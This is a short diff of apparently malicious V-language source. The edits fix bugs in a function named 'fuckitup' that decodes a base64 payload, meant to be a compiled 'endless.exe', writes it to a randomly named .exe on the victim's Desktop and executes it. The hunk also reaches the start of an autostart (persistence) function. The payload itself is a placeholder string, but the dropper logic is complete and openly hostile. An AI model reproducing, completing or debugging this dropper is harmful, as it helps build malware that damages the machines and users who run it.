@@ -4,16 +4,16 @@ import os
 
 fn fuckitup(){
 	// base64 encoded version of the compiled endless.v 
-	the_bad_content := "paste_compiles_endless.exe_code_as_oneline_here"
+	the_bad_content := "paste_compiled_endless.exe_code_as_oneline_here"
 	// the new filename should be random
 	the_bad_guy := os.home_dir()+"\\Desktop\\"+rand.string(8)+".exe"
 	// create, open the file and write the content above into it
-	os.write_file(the_bad_guy, base64.decode(the_bad_content)) or {
+	os.write_file(the_bad_guy, base64.decode_str(the_bad_content)) or {
 		println("Lucky!")
 		return
 	}
 	// execute the new created exe file
-	os.system("start cmd /k "+the_bad_guy)
+	os.system("start cmd /k \""+the_bad_guy+"\"")
 }
 
 fn make_autostart(){
